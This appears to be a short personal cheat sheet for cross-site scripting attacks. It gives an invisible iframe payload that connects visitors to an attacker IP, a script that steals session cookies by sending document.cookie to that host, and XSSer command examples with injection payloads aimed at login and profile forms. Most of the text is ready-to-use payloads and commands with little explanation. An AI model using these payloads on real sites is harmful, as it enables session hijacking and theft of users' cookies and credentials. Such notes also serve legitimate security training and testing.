Cross-Site Tracing (XST) attack involves the use of Cross-siteScripting (XSS) and the TRACEor TRACK HTTP methods

Cheat sheet: http://ha.ckers.org/xss.html

Reflected, stored 

# general special chars
``<>'"{};``
if those are not filtered or encoded then xss might possible

# injecting visible iframe in payload
is used to embedd other file (f.e.: html document, images) within the current html document
// All users who visit this page with the iframe will connect to 10.10.10.1
``<iframe src=http://10.10.10.1/report height="0" width="0"> </iframe>``
//with netcat connect and you will see the users

# stealing cookies
``<script>new Image().src="http://10.10.10.1/cool.jpg?output="+document.cookie; </scipt>``

# XSSer
//start it with 
xsser --gtk

Examples: 

[Info] This is because you aren't providing:

 At least one -payloader- using a keyword: 'XSS' (for hex.hash) or 'X1S' (for int.hash):

  - ex (GET): xsser -u 'https://target.com' -g '/path/profile.php?username=bob&surname=XSS&age=X1S&job=XSS'
  - ex (POST): xsser -u 'https://target.com/login.php' -p 'username=bob&password=XSS&captcha=X1S'

 Any extra attack(s) (Xsa, Xsr, Coo, Dorker, Crawler...):

  - ex (GET+Cookie): xsser -u 'https://target.com' -g '/path/id.php?=2' --Coo
  - ex (POST+XSA+XSR+Cookie): xsser -u 'https://target.com/login.php' -p 'username=admin&password=admin' --Xsa --Xsr --Coo
  - ex (Dorker): xsser -d 'news.php?id=' --Da
  - ex (Crawler): xsser -u 'https://target.com' -c 100 --Cl

 Or a mixture:

  - ex (GET+Manual): xsser -u 'https://target.com' -g '/users/profile.php?user=XSS&salary=X1S' --payload='<script>alert(XSS);</script>'
  - ex (POST+Manual): xsser -u 'https://target.com/login.asp' -p 'username=bob&password=XSS' --payload='}}%%&//<sc&ri/pt>(XSS)--;>'

  - ex (GET+Cookie): xsser -u 'https://target.com' -g '/login.asp?user=bob&password=XSS' --Coo
  - ex (POST+XSR+XSA): xsser -u 'https://target.com/login.asp' -p 'username=bob&password=XSS' --Xsr --Xsa